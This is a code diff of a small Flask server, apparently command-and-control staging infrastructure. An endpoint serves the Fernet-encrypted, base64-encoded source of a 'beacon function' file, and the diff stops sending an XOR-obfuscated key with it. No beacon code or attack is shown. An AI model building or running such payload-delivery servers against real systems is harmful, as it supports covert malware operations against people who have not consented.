@@ -9,7 +9,7 @@ app = Flask(__name__)
 fernet_key = b""
 fernet_key_str = ""
 fernet_key_str_encrypted = ""
-personal_key = "your_own_key"
+PERSONAL_KEY = "your_own_key"
 
 
 def xor_encrypt(text, key):
@@ -23,15 +23,24 @@ def xor_decrypt(encrypted_text, key):
     return decrypted
 
 
-@app.route('/beacon_function_source', methods=['GET'])
-def get_beacon_function_source():
-    try:
-        with open('CAC_beacon_function_source.txt', 'r') as file:
-            content = file.read()
 
-        return jsonify({'encrypted': content, 'key': fernet_key_str_encrypted}), 200    # returning the fernet key needed to decrypt the beacon_function_source encrypted with a simple xor encryption
+# senden von fulcrum
+@app.route('/beacon_function_source', methods=['GET'])
+def get_beacon_source():
+    try:
+        # source code aus datei lesen und verschlüsseln
+        with open('CAC_beacon_function_source', 'rb') as file:
+            file_content = file.read()
+
+        encrypted_content = cipher.encrypt(file_content)
+
+        # benutzten von base64 für json
+        encoded_content = base64.b64encode(encrypted_content).decode('utf-8')
+
+        return jsonify({'source': encoded_content}), 200
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
 
 
 if __name__ == '__main__':
@@ -46,7 +55,7 @@ if __name__ == '__main__':
             fernet_key = base64.urlsafe_b64decode(fernet_key)
 
         fernet_key_str = base64.urlsafe_b64encode(fernet_key).decode('utf-8')  # Encode the key to a string
-        fernet_key_str_encrypted = xor_encrypt(fernet_key_str, personal_key)
+        fernet_key_str_encrypted = xor_encrypt(fernet_key_str, PERSONAL_KEY)
 
     cipher = Fernet(fernet_key)
 
